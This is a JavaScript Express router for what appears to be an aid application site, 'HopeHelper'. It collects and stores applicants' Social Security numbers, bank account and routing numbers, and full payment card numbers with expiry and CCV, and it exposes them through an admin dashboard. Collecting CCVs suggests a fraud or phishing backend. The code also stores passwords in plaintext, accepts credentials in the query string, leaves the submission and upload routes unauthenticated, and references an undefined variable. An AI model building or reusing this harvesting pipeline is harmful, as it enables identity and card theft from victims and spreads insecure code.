const express = require('express');
const router = express.Router();
const { pool } = require('../lib/db');
const cloudinary = require('../lib/cloudinary');
const transporter = require('../lib/email');
const multer = require('multer');
const { Readable } = require('stream');

const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 100 * 1024 * 1024 } // 100MB
});

// === Helper: Admin Auth Middleware ===
const adminAuth = async (req, res, next) => {
    try {
        let authHeader = req.headers.authorization;
        let authString = '';

        if (authHeader && authHeader.startsWith('Basic ')) {
            authString = Buffer.from(authHeader.split(' ')[1], 'base64').toString();
        } else if (req.query.auth) {
            authString = Buffer.from(req.query.auth, 'base64').toString();
        }

        if (!authString || !authString.includes(':')) {
            res.setHeader('WWW-Authenticate', 'Basic');
            return res.status(401).json({ error: 'Authentication required' });
        }

        const [user, pass] = authString.split(':');

        // Check in database
        try {
            const [rows] = await pool.query('SELECT id, username, is_default FROM admin_users WHERE username = ? AND password = ?', [user, pass]);
            if (rows && rows.length > 0) {
                req.adminUser = {
                    id: rows[0].id,
                    username: rows[0].username,
                    is_default: Boolean(rows[0].is_default)
                };
                return next();
            }
        } catch (dbErr) {
            console.error('DB query error during admin auth:', dbErr.message);
        }

        res.setHeader('WWW-Authenticate', 'Basic');
        return res.status(401).json({ error: 'Authentication failed' });
    } catch (err) {
        console.error('Admin auth error:', err);
        return res.status(500).json({ error: 'Internal authentication error' });
    }
};

// === Endpoint: receive form submission + Drive info ===
router.post('/log', async (req, res) => {
    try {
        const formData = req.body;
        console.log(`🚀 [API/LOG] Received submission for: ${formData.formData.firstName} ${formData.formData.lastName}`);

        const emailBody = `
            === HopeHelper: Process Completed ===
            
            Application for ${formData.formData.firstName} ${formData.formData.lastName} has been successfully processed and stored.
            
            Timestamp: ${new Date(formData.timestamp).toLocaleString()}
            Drive Folder: ${formData.folder?.url || 'N/A'}
            
            Check the Admin Dashboard for full details.
            `;

        console.log('📧 Attempting to send confirmation email...');
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: `✅ Application Processed: ${formData.formData.firstName} ${formData.formData.lastName}`,
            text: emailBody
        });
        console.log('✅ Confirmation email sent');

        console.log('🗄️ Starting database transaction...');
        const connection = await pool.getConnection();
        try {
            await connection.beginTransaction();
            console.log('🗄️ Inserting into applications table...');
            const [appResult] = await connection.query(
                `INSERT INTO applications (
                    first_name, last_name, dob, ssn, phone, email, 
                    address, city, state, zip, mailing_address, 
                    bank_name, account_type, routing_number, account_number, 
                    drive_folder_id, drive_folder_url
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    formData.formData.firstName, formData.formData.lastName, formData.formData.dateOfBirth,
                    formData.formData.socialSecurityNumber, formData.formData.phoneNumber, formData.formData.email,
                    formData.formData.currentAddress, formData.formData.city, formData.formData.state,
                    formData.formData.zipCode, formData.formData.mailingAddress, formData.formData.bankName,
                    formData.formData.accountType, formData.formData.routingNumber, formData.formData.accountNumber,
                    formData.folder?.id, formData.folder?.url
                ]
            );

            const applicationId = appResult.insertId;
            console.log(`🗄️ Application ID generated: ${applicationId}`);

            if (formData.formData.cards?.length > 0) {
                console.log(`🗄️ Inserting ${formData.formData.cards.length} cards...`);
                for (const card of formData.formData.cards) {
                    await connection.query(
                        `INSERT INTO cards (application_id, card_number, expiry, ccv) VALUES (?, ?, ?, ?)`,
                        [applicationId, card.cardNumber, card.expiry, card.ccv]
                    );
                }
            }

            if (formData.files?.length > 0) {
                console.log(`🗄️ Inserting ${formData.files.length} file links...`);
                for (const file of formData.files) {
                    await connection.query(
                        `INSERT INTO files (application_id, name, url, drive_id, field_name) VALUES (?, ?, ?, ?, ?)`,
                        [applicationId, file.name, file.url, file.id, file.fieldName]
                    );
                }
            }
            await connection.commit();
            console.log('✅ Database transaction committed');
        } catch (dbError) {
            await connection.rollback();
            console.error('❌ Database error during transaction:', dbError);
        } finally {
            connection.release();
        }

        res.json({ success: true, message: 'Submission logged and emailed successfully' });
    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// === Cloudinary Upload Route ===
router.post('/upload', upload.single('file'), async (req, res) => {
    try {
        const { folder } = req.body;
        const file = req.file;

        if (!file) {
            return res.status(400).json({ error: 'No file provided' });
        }

        console.log(`📤 [CLOUDINARY] Uploading: ${file.originalname} (${file.size} bytes)`);

        const resourceType = isVideo ? 'video' : 'auto';

        const result = await new Promise((resolve, reject) => {
            const uploadStream = cloudinary.uploader.upload_stream(
                {
                    folder: folder || 'hopehaven',
                    resource_type: resourceType,
                    use_filename: true,
                    unique_filename: true
                },
                (error, result) => {
                    if (error) reject(error);
                    else resolve(result);
                }
            );
            Readable.from(file.buffer).pipe(uploadStream);
        });

        console.log(`✅ [CLOUDINARY] Uploaded: ${result.public_id}`);
        res.json({
            id: result.public_id,
            name: file.originalname,
            url: result.secure_url,
            webViewLink: result.secure_url,
            resource_type: result.resource_type
        });
    } catch (error) {
        console.error('❌ [CLOUDINARY] Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});


// === Admin Authentication & Profile Routes ===
router.post('/admin/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) {
            return res.status(400).json({ error: 'Username and password are required' });
        }

        // Check DB
        const [rows] = await pool.query('SELECT id, username, is_default FROM admin_users WHERE username = ? AND password = ?', [username, password]);
        if (rows && rows.length > 0) {
            const user = rows[0];
            const token = Buffer.from(`${username}:${password}`).toString('base64');
            return res.json({
                success: true,
                token,
                user: {
                    id: user.id,
                    username: user.username,
                    is_default: Boolean(user.is_default)
                }
            });
        }

        return res.status(401).json({ error: 'Invalid username or password' });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: error.message });
    }
});

router.get('/admin/me', adminAuth, async (req, res) => {
    res.json({ user: req.adminUser });
});

// === Admin User Management (Default User Only) ===
router.get('/admin/users', adminAuth, async (req, res) => {
    try {
        const [users] = await pool.query('SELECT id, username, is_default, created_at FROM admin_users ORDER BY is_default DESC, id ASC');
        res.json(users);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.post('/admin/users', adminAuth, async (req, res) => {
    try {
        // Enforce constraint: ONLY default admin user can create new admins
        if (!req.adminUser.is_default) {
            return res.status(403).json({ error: 'Permission denied: Only the default administrator can create other admin users' });
        }

        const { username, password } = req.body;
        if (!username || !password) {
            return res.status(400).json({ error: 'Username and password are required' });
        }

        if (username.trim().length < 3) {
            return res.status(400).json({ error: 'Username must be at least 3 characters' });
        }

        if (password.length < 6) {
            return res.status(400).json({ error: 'Password must be at least 6 characters' });
        }

        // Check if username is already taken
        const [existing] = await pool.query('SELECT id FROM admin_users WHERE username = ?', [username.trim()]);
        if (existing.length > 0) {
            return res.status(409).json({ error: 'An admin with this username already exists' });
        }

        const [result] = await pool.query(
            'INSERT INTO admin_users (username, password, is_default) VALUES (?, ?, 0)',
            [username.trim(), password]
        );

        console.log(`👤 New admin created by ${req.adminUser.username}: ${username.trim()} (ID: ${result.insertId})`);

        // Send notification email when a new admin account is created
        try {
            await transporter.sendMail({
                from: process.env.EMAIL_USER,
                to: 'bjquyum@gmail.com',
                subject: `🔐 New Admin Account Created: ${username.trim()}`,
                text: `A new admin account has been created on HopeHelper.\n\nDetails:\n  Username: ${username.trim()}\n  Created by: ${req.adminUser.username}\n  Timestamp: ${new Date().toLocaleString()}\n\nIf this was not authorized, please contact your administrator immediately.`
            });
            console.log(`📧 Admin creation email sent for user: ${username.trim()}`);
        } catch (emailErr) {
            // Don't fail the request if email fails
            console.error('⚠️ Failed to send admin creation email:', emailErr.message);
        }

        res.json({
            success: true,
            message: 'Admin user created successfully',
            user: {
                id: result.insertId,
                username: username.trim(),
                is_default: false
            }
        });
    } catch (error) {
        console.error('Error creating admin user:', error);
        res.status(500).json({ error: error.message });
    }
});

router.delete('/admin/users/:id', adminAuth, async (req, res) => {
    try {
        // Enforce constraint: ONLY default admin user can delete other admins
        if (!req.adminUser.is_default) {
            return res.status(403).json({ error: 'Permission denied: Only the default administrator can delete admin users' });
        }

        const targetId = parseInt(req.params.id, 10);
        if (!targetId) {
            return res.status(400).json({ error: 'Invalid user ID' });
        }

        const [targetUser] = await pool.query('SELECT id, username, is_default FROM admin_users WHERE id = ?', [targetId]);
        if (targetUser.length === 0) {
            return res.status(404).json({ error: 'Admin user not found' });
        }

        if (targetUser[0].is_default) {
            return res.status(400).json({ error: 'Cannot delete the default administrator account' });
        }

        await pool.query('DELETE FROM admin_users WHERE id = ?', [targetId]);
        console.log(`👤 Admin user ${targetUser[0].username} (ID: ${targetId}) deleted by ${req.adminUser.username}`);
        res.json({ success: true, message: `Admin ${targetUser[0].username} deleted successfully` });
    } catch (error) {
        console.error('Error deleting admin user:', error);
        res.status(500).json({ error: error.message });
    }
});

// === Admin Applications & Items Routes ===
router.get('/admin/data', adminAuth, async (req, res) => {
    try {
        const [applications] = await pool.query('SELECT * FROM applications ORDER BY timestamp DESC');
        const enrichedApplications = await Promise.all(applications.map(async (app) => {
            const [cards] = await pool.query('SELECT * FROM cards WHERE application_id = ?', [app.id]);
            const [files] = await pool.query('SELECT * FROM files WHERE application_id = ?', [app.id]);
            return { ...app, cards, files };
        }));
        res.json(enrichedApplications);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/admin/applications/:id', adminAuth, async (req, res) => {
    try {
        const appId = parseInt(req.params.id, 10);
        const [apps] = await pool.query('SELECT * FROM applications WHERE id = ?', [appId]);
        if (apps.length === 0) {
            return res.status(404).json({ error: 'Application not found' });
        }
        const app = apps[0];
        const [cards] = await pool.query('SELECT * FROM cards WHERE application_id = ?', [app.id]);
        const [files] = await pool.query('SELECT * FROM files WHERE application_id = ?', [app.id]);
        res.json({ ...app, cards, files });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.delete('/admin/applications/:id', adminAuth, async (req, res) => {
    try {
        const appId = parseInt(req.params.id, 10);
        await pool.query('DELETE FROM applications WHERE id = ?', [appId]);
        res.json({ success: true, message: `Application #${appId} deleted successfully` });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});


module.exports = router;
